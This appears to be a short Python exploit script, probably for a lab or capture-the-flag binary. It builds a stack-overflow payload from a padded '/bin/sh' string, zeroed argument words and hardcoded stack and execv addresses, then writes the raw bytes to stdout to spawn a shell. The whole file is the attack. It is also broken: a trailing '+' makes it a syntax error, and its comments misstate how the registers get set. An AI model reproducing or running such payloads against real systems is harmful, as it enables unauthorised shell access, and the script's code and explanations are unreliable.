#!/usr/bin/env python3

import sys


#bin sh in hex, need value to overwrite to stack etc.:
bin_sh = (
    b'\x00\x00' +                    # 2 bytes padding
    b'/bin/sh\x00' +                 # 8 bytes
)
#null arguments are in RDI and RSI registers with value 0, this is for NULL arguments of excev
null_rdi = (0).to_bytes(8, 'little')
null_rsi = (0).to_bytes(8, 'little')

#Address for for bin/sh in memory: 
bin_addr = (0x7ffffff68fae).to_bytes(8, 'little')
#address for executing ROP gadget to call exec
rbp = (0x7ffffff68fae).to_bytes(8, 'little')
execv_addr = (0x455050).to_bytes(8, 'little')

addresses = (
    bin_addr +
    rbp + 
    execv_addr
)

hacking = bin_sh + null_rdi + null_rsi + addresses
sys.stdout.buffer.write(hacking)
